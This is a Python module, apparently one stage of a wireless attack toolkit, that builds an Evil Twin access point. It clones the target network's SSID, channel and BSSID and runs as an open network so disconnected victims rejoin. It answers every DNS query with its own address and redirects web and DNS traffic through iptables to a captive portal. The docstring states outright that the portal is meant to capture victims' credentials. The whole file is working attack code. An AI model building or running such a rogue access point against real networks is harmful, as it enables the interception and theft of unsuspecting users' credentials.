"""Stage 4 — Malicious Network Creation (the Evil Twin).

This stands up a rogue access point that looks identical to the target: same SSID, same
channel, and (optionally) the same BSSID.  The twin is run as an **open** network so the
disconnected victim re-associates with no password prompt, and every supporting service a
real network provides is recreated locally:

* ``hostapd``  — turns the AP adapter into an 802.11 access point (the beaconing radio).
* ``dnsmasq``  — hands out DHCP leases and answers *every* DNS query with our own IP, so all
  the victim's traffic is funnelled to us (a wildcard DNS hijack).
* ``ip`` + ``iptables`` — give the AP interface a gateway address and redirect the victim's
  web traffic to the captive portal.

We deliberately provide **no upstream internet**: with DNS pointing everywhere at us and no
route out, the victim's OS decides it is behind a captive portal and pops the login page —
which is exactly the credential-capture surface we want.

All generated configs and service logs are written under ``captured/`` and every system
change (IP address, forwarding, iptables rules, interface mode, processes) is registered for
automatic teardown on exit.
"""

from __future__ import annotations

import os
import time
from dataclasses import dataclass
from typing import List, Optional, Tuple

from core import interfaces, sysutils
from core.state import STATE, Stage, StageStatus

CAPTURE_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "captured")


@dataclass
class RogueAPConfig:
    """Network parameters for the rogue AP (sane lab defaults)."""

    gateway_ip: str = "10.0.0.1"
    netmask: str = "255.255.255.0"
    cidr: int = 24
    dhcp_start: str = "10.0.0.10"
    dhcp_end: str = "10.0.0.100"
    lease_time: str = "12h"
    portal_port: int = 80
    lease_file: str = os.path.join(CAPTURE_DIR, "dnsmasq.leases")


class RogueAP:
    """Creates, runs, and tears down the Evil Twin access point."""

    def __init__(
        self,
        ap_iface: str,
        ssid: str,
        channel: int,
        bssid: Optional[str] = None,
        clone_bssid: bool = True,
        config: Optional[RogueAPConfig] = None,
    ):
        self.iface = ap_iface
        self.ssid = ssid
        self.channel = channel or 6
        self.target_bssid = bssid
        self.clone_bssid = clone_bssid and bool(bssid)
        self.cfg = config or RogueAPConfig()

        self.hostapd_conf = os.path.join(CAPTURE_DIR, "hostapd.conf")
        self.dnsmasq_conf = os.path.join(CAPTURE_DIR, "dnsmasq.conf")
        self.hostapd_log = os.path.join(CAPTURE_DIR, "hostapd.log")
        self.dnsmasq_log = os.path.join(CAPTURE_DIR, "dnsmasq.log")

        self._hostapd = None
        self._dnsmasq = None
        self._iptables_rules: List[Tuple[str, List[str]]] = []
        self._running = False

    # ------------------------------------------------------------------
    # Config generation
    # ------------------------------------------------------------------

    def _is_5ghz(self) -> bool:
        return self.channel >= 36

    def _hostapd_config_text(self) -> str:
        hw_mode = "a" if self._is_5ghz() else "g"
        lines = [
            f"interface={self.iface}",
            "driver=nl80211",
            f"ssid={self.ssid}",
            f"hw_mode={hw_mode}",
            f"channel={self.channel}",
            "country_code=US",
            "ignore_broadcast_ssid=0",
            # Open network — no encryption — so the victim re-associates seamlessly.
        ]
        if self._is_5ghz():
            lines.append("ieee80211d=1")
        if self.clone_bssid and self.target_bssid:
            # Make the twin byte-for-byte identical at L2 as well.
            lines.append(f"bssid={self.target_bssid}")
        return "\n".join(lines) + "\n"

    def _dnsmasq_config_text(self) -> str:
        return (
            f"interface={self.iface}\n"
            "bind-interfaces\n"
            "except-interface=lo\n"
            f"listen-address={self.cfg.gateway_ip}\n"
            f"dhcp-range={self.cfg.dhcp_start},{self.cfg.dhcp_end},"
            f"{self.cfg.netmask},{self.cfg.lease_time}\n"
            f"dhcp-option=3,{self.cfg.gateway_ip}\n"     # default gateway = us
            f"dhcp-option=6,{self.cfg.gateway_ip}\n"     # DNS server = us
            f"address=/#/{self.cfg.gateway_ip}\n"        # wildcard DNS hijack -> portal
            "no-resolv\n"
            f"dhcp-leasefile={self.cfg.lease_file}\n"
            "log-queries\n"
            "log-dhcp\n"
        )

    # ------------------------------------------------------------------
    # System plumbing
    # ------------------------------------------------------------------

    def _add_iptables(self, table: str, args: List[str]) -> None:
        """Add an iptables rule (append) and remember it for teardown."""
        sysutils.run(["iptables", "-t", table, "-A", *args], check=False)
        self._iptables_rules.append((table, args))

    def _setup_network(self) -> None:
        gw, cidr = self.cfg.gateway_ip, self.cfg.cidr

        # Interface: leave monitor mode, take managed, bring up with the gateway IP.
        interfaces.set_managed_mode(self.iface)
        sysutils.run(["ip", "addr", "flush", "dev", self.iface], check=False)
        sysutils.run(["ip", "link", "set", self.iface, "up"], check=False)
        sysutils.run(
            ["ip", "addr", "add", f"{gw}/{cidr}", "dev", self.iface], check=False
        )

        # Enable forwarding (lets DNAT'd packets reach the local portal cleanly).
        sysutils.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)

        # Redirect the victim's web + DNS traffic to us.
        port = str(self.cfg.portal_port)
        self._add_iptables("nat", ["PREROUTING", "-i", self.iface, "-p", "udp",
                                   "--dport", "53", "-j", "DNAT",
                                   "--to-destination", f"{gw}:53"])
        self._add_iptables("nat", ["PREROUTING", "-i", self.iface, "-p", "tcp",
                                   "--dport", "80", "-j", "DNAT",
                                   "--to-destination", f"{gw}:{port}"])
        self._add_iptables("nat", ["PREROUTING", "-i", self.iface, "-p", "tcp",
                                   "--dport", "443", "-j", "DNAT",
                                   "--to-destination", f"{gw}:{port}"])

    def _teardown_network(self) -> None:
        # Delete exactly the rules we added (reverse order).
        for table, args in reversed(self._iptables_rules):
            sysutils.run(["iptables", "-t", table, "-D", *args], check=False)
        self._iptables_rules.clear()
        sysutils.run(["ip", "addr", "flush", "dev", self.iface], check=False)

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def start(self) -> bool:
        """Bring the Evil Twin online. Returns True on success."""
        missing = sysutils.check_dependencies(["hostapd", "dnsmasq", "iptables"])
        if missing:
            STATE.log(f"Cannot start Evil Twin — missing: {', '.join(missing)}",
                      level="error")
            return False

        os.makedirs(CAPTURE_DIR, exist_ok=True)
        STATE.set_stage(Stage.EVIL_TWIN, StageStatus.RUNNING)

        sysutils.write_file(self.hostapd_conf, self._hostapd_config_text())
        sysutils.write_file(self.dnsmasq_conf, self._dnsmasq_config_text())

        self._setup_network()

        # Register teardown now so partial setups still get cleaned up.
        sysutils.register_cleanup(self.stop)

        # hostapd: the access-point radio.
        self._hostapd = sysutils.spawn(
            ["hostapd", self.hostapd_conf], log_path=self.hostapd_log
        )
        time.sleep(2.0)  # give it a moment to claim the radio (or fail)
        if self._hostapd.poll() is not None:
            STATE.set_stage(Stage.EVIL_TWIN, StageStatus.FAILED)
            STATE.log("hostapd failed to start — see captured/hostapd.log", level="error")
            self.stop()
            return False

        # dnsmasq: DHCP + DNS hijack.  Use only our config (no system defaults).
        self._dnsmasq = sysutils.spawn(
            ["dnsmasq", "--keep-in-foreground", "--conf-file=" + self.dnsmasq_conf,
             "--no-daemon"],
            log_path=self.dnsmasq_log,
        )
        time.sleep(1.0)
        if self._dnsmasq.poll() is not None:
            STATE.set_stage(Stage.EVIL_TWIN, StageStatus.FAILED)
            STATE.log("dnsmasq failed to start — see captured/dnsmasq.log (port 53 in "
                      "use by systemd-resolved?)", level="error")
            self.stop()
            return False

        self._running = True
        STATE.ap_running = True
        STATE.set_stage(Stage.EVIL_TWIN, StageStatus.DONE)
        STATE.log(
            f"Evil Twin online: SSID='{self.ssid}' ch={self.channel} "
            f"bssid={'cloned ' + str(self.target_bssid) if self.clone_bssid else 'own'} "
            f"on {self.iface}",
            level="good",
        )
        return True

    def stop(self) -> None:
        """Stop services and undo all system changes (idempotent)."""
        if self._dnsmasq is not None:
            sysutils.stop_process(self._dnsmasq)
            self._dnsmasq = None
        if self._hostapd is not None:
            sysutils.stop_process(self._hostapd)
            self._hostapd = None
        self._teardown_network()
        if self._running:
            STATE.log("Evil Twin stopped and network changes reverted.", level="info")
        self._running = False
        STATE.ap_running = False

    # ------------------------------------------------------------------
    # Feedback helpers
    # ------------------------------------------------------------------

    def connected_clients(self) -> List[Tuple[str, str, str]]:
        """Parse the dnsmasq lease file → list of (ip, mac, hostname).

        Lets the UI show, in real time, who has actually joined the Evil Twin.
        """
        leases: List[Tuple[str, str, str]] = []
        try:
            with open(self.cfg.lease_file) as fh:
                for line in fh:
                    parts = line.split()
                    # format: <expiry> <mac> <ip> <hostname> <client-id>
                    if len(parts) >= 4:
                        leases.append((parts[2], parts[1], parts[3]))
        except FileNotFoundError:
            pass
        return leases

    @property
    def running(self) -> bool:
        return self._running
